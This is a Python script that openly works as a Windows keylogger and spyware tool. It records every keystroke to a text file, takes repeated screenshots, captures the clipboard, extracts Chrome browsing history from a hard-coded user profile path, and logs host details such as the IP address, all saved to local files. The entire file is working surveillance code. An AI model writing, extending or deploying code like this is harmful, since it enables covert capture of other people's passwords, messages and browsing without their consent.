from pynput.keyboard import Key, Listener
import sqlite3
import datetime
import socket
import platform
import pandas as pd
import win32clipboard
from PIL import ImageGrab
import time
import threading

# Global flag to signal threads to exit
exit_flag = threading.Event()

# Function to get the Chrome history and store it in Excel
def get_chrome_history():
    conn = sqlite3.connect("C:\\Users\\Pratik\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History")
    cursor = conn.cursor()


    # Retrieve search history from the database
    cursor.execute("SELECT url, title, datetime((last_visit_time/1000000)-11644473600, 'unixepoch', 'localtime') AS last_visit_time FROM urls")
    search_history = cursor.fetchall()

    # Create a pandas DataFrame from the retrieved search history
    df = pd.DataFrame(search_history, columns=['url', 'title', 'Timestamp'])

    # Save the search history DataFrame to an Excel file
    excel_file = "search_history.xlsx"
    df.to_excel(excel_file, index=False)

    # Close the database connection
    conn.close()

# Function to take a screenshot
def screenshot(i):
    im = ImageGrab.grab()
    im.save(f"screenshot{i}.png")

 # Function to take screenshots at regular intervals
def capture_screenshots(interval_seconds, total_screenshots):
     for i in range(total_screenshots):
        screenshot(i)
        if exit_flag.is_set():
            break #Exit the loop if the flag is set
        time.sleep(interval_seconds)

# Record keystrokes and store in a text file
k = []

def on_press(key):
    k.append(key)
    write_file(k)
    print(key)


def write_file(var):
    with open("logs.txt", "a") as f:
        for i in var:
            new_var = str(i).replace("'", "")
            f.write(new_var)
            f.write(" ")

def on_release(key):
    if key == Key.esc:
        return False



# Get computer information and store in an Excel file
date = datetime.date.today()
ip_address = socket.gethostbyname(socket.gethostname())
processor = platform.processor()
system = platform.system()
release = platform.release()
host_name = socket.gethostname()

data = {
    'Metric': ['Date', 'IP Address', 'Processor', 'System', 'Release', 'Host Name'],
    'Value': [date, ip_address, processor, system, release, host_name]
}
df = pd.DataFrame(data)
df.to_excel('computer_info.xlsx', index=False)

# Get clipboard information and store in a text file
def copy_clipboard():
    current_date = datetime.datetime.now()
    with open("clipboard.txt", "a") as f:
        win32clipboard.OpenClipboard()
        pasted_data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()

        f.write("\n")
        f.write("date and time:" + str(current_date) + "\n")
        f.write("clipboard data: \n" + pasted_data)

copy_clipboard()

# Get Chrome history and store in Excel file
get_chrome_history()

# Create a separate thread for capturing screenshots
screenshot_thread = threading.Thread(target=capture_screenshots, args=(7, 10) , daemon=True)
screenshot_thread.start()

# Create a separate thread for the listener
listener_thread = threading.Thread(target=lambda: Listener(on_press=on_press, on_release=on_release).start())


try:
    # Run the keylogger in the main thread
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except KeyboardInterrupt:
    pass  # Handle KeyboardInterrupt to gracefully exit the program

# Set the exit flag to stop threads
exit_flag.set()


# Wait for the listener and screenshot threads to finish before exiting
# Ensure threads are started before attempting to join them
if screenshot_thread.is_alive():
    screenshot_thread.join(timeout=0)  # Adjust the timeout as needed

if listener_thread.is_alive():
    listener_thread.join()


